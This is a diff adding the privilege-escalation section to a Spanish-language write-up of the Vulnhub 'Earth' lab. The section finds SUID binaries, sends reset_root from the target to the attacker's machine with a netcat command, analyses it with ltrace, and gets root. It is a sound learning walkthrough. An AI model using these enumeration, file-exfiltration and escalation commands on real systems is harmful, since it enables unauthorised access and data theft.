@@ -3,7 +3,7 @@ title : "Writeup - Earth Vulnhub | Sergio Castro"
 author: Sergi Castro
 date: 2025-09-10
 categories: [Vulnhub, Vulnhub-Linux, Vulnhub-Easy]
-tags: [nmap,exploits,netdiscover,]
+tags: [nmap,exploits,netdiscover,netcat,binaries]
 ---
 
 [Link Máquina](https://www.vulnhub.com/entry/the-planets-earth,755/)
@@ -287,4 +287,72 @@ Entre muchos ficheros encontramos la flag del usuario finalmente.
 
 Ahora bien para poder escalar los privilegios, comprobaremos los SUID de los binarios de los sistemas que al igual que en jangow es una buena práctica de inicio, lo haremos usando el mismo comando de la anterior máquina.
 
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+<img width="683" height="456" alt="image" src="https://github.com/user-attachments/assets/e53aba79-cd4e-4ad6-a32e-5bcca2ec6639" />
+
+Entre los binarios vemos este que se llama reset_root que parece interesante, reiniciaría el acceso root y podríamos obtener el escalado que buscamos, vamos a probar a ejecutar el script:
+
+<img width="585" height="150" alt="image" src="https://github.com/user-attachments/assets/a200d176-c96c-4cb5-aa54-aa9f14d3a3da" />
+
+Vemos que requiere algunos triggers, que no tenemos y que ciertamente no sabemos nada sobre ellos, para obtener algo más de información investigando he encontrado la herramienta **ltrace**, que permite interceptar y mostrar las llamadas a funciones de las bibliotecas compartidas hechas por un proceso y sus argumentos y valores de retorno.
+
+Nos servirá para depurar y hacer ingeniería inversa ligera al reset_root y extraer la información de los triggers.
+
+Para ello primero nos llevamos el binario a nuestro sistema local, para ello usaremos netcat mismamente, abriendo otra shell por ejemplo en el puerto 9002 de la máquina anfitrión y diciendo que lo que se enviara a la máquina sera el reset_root de la máquina remota.
+
+```
+nc -lp 9002 > reset_root
+```
+Y esto será lo que escribamos en la shell remota de netcat ya abierta:
+
+```
+nc -w 3 ipanfitrion port < /usr/bin/reset_root
+```
+
+-w 3: establece un timeout (tiempo de espera) de 3 segundos. Según la versión de nc, esto afecta:
+
+-- El tiempo máximo que espera al conectar, y/o el tiempo que espera tras EOF antes de cerrar la conexión.
+-- (El comportamiento exacto puede variar entre implementaciones de netcat: traditional, GNU netcat, OpenBSD netcat, etc.)
+
+- < /usr/bin/reset_root — redirección de entrada: el fichero /usr/bin/reset_root se lee y su contenido se envía como stdin a nc, por tanto sale por la conexión.
+
+Cuando escribamos el nc en la shell ya abierta, se habrá enviado el fichero reset_root al anfitrión, en mi caso mi kali.
+
+<img width="650" height="107" alt="image" src="https://github.com/user-attachments/assets/f5178a82-8c09-4e47-a43f-005772b02036" />
+
+<img width="318" height="152" alt="image" src="https://github.com/user-attachments/assets/f15e7236-7f7a-4560-a5a4-b56b237c07a8" />
+
+Le damos permisos de ejecución al fichero con:
+
+```
+chmod +x reset_root
+```
+Y ejecutamos con:
+
+```
+ltrace reset_root
+```
+<img width="1296" height="352" alt="image" src="https://github.com/user-attachments/assets/08f8e79b-b03e-41f0-aedc-6dd344e8470a" />
+
+Nos da la pista de 3 ficheros que necesitamos tener, vamos a crearlos de manera manual ya que al no existir los mismos pues podemos hacerlo así con touch y con ello volver a probar el binario.
+
+<img width="687" height="252" alt="image" src="https://github.com/user-attachments/assets/4e68d8de-4fb2-47f6-9a77-923e354d512f" />
+
+Con esto tenemos reiniciada la contraseña del usuario su que ahora es Earth, por lo que finalmente tenemos acceso como root, ahora iniciamos sesión usando
+
+```
+su root
+```
+<img width="723" height="162" alt="image" src="https://github.com/user-attachments/assets/0f08e440-5e49-425b-abdc-30bff353c73f" />
+
+Ya somos root, vamos al directorio del root para buscar la última flag:
+
+<img width="1100" height="833" alt="image" src="https://github.com/user-attachments/assets/f81151b9-6162-4b78-9b8b-14a3d984e277" />
+
+Y con esto completamos la máquina.
+
 ## Conclusiones {#conclusiones}
+
+Fue una gran máquina, no muy larga pero muchos días estuve para acabarla, tiene algunas dificultes extras y algunas nuevas técnicas aprendidas como uso más avanzado de netcat o descubrimiento de nuevos binarios.
